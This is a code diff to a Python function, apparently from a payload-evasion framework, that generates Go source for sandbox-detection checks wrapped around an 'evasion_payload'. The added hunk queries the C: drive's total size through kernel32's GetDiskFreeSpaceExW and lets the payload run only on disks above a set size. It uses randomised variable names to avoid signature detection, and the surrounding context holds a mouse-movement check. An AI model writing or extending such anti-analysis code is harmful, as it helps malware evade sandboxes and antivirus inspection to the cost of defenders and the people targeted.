@@ -856,6 +856,31 @@ def senecas_games(evasion_payload):
             check_code += cursor_position + '.Call(uintptr(unsafe.Pointer(&' + point_var2 + ')))\n'
             check_code += 'if ' + point_var1 + '.x - ' + point_var2 + '.x == 0 && ' + point_var1 + '.y - ' + point_var2 + '.y == 0 {\n'
             num_tabs_required += 1
+        
+        if evasion_payload.required_options["DISKSIZE"][0].lower() != 'x':
+
+            min_disk_size = evasion_helpers.randomString()
+            kernel32 = evasion_helpers.randomString()
+            getDiskFreeSpaceEx = evasion_helpers.randomString()
+            lpFreeBytesAvailable = evasion_helpers.randomString()
+            lpTotalNumberOfBytes = evasion_helpers.randomString()
+            lpTotalNumberOfFreeBytes = evasion_helpers.randomString()
+            cur_disk_size = evasion_helpers.randomString()
+
+            check_code += min_disk_size + ' := float32(' + evasion_payload.required_options["DISKSIZE"][0] + ')\n'
+            check_code += 'var ' + kernel32 + ' = syscall.NewLazyDLL("kernel32.dll")\n'
+            check_code += 'var ' + getDiskFreeSpaceEx + ' = ' + kernel32 + '.NewProc("GetDiskFreeSpaceExW")\n'
+            check_code += lpFreeBytesAvailable + ' := int64(0)\n'
+            check_code += '\t' + lpTotalNumberOfBytes + ' := int64(0)\n'
+            check_code += '\t' + lpTotalNumberOfFreeBytes + ' := int64(0)\n'
+            check_code += getDiskFreeSpaceEx + '.Call(\n'
+            check_code += '\tuintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("C:"))),\n'
+            check_code += '\tuintptr(unsafe.Pointer(&' + lpFreeBytesAvailable + ')),\n'
+            check_code += '\tuintptr(unsafe.Pointer(&' + lpTotalNumberOfBytes + ')),\n'
+            check_code += '\tuintptr(unsafe.Pointer(&' + lpTotalNumberOfFreeBytes + ')))\n'
+            check_code += cur_disk_size + ' := float32(' + lpTotalNumberOfBytes + ')/1073741824\n'
+            check_code += 'if (' + cur_disk_size + ' > ' + min_disk_size + ') {\n'
+            num_tabs_required += 1
 
         # Return check information
         return check_code, num_tabs_required
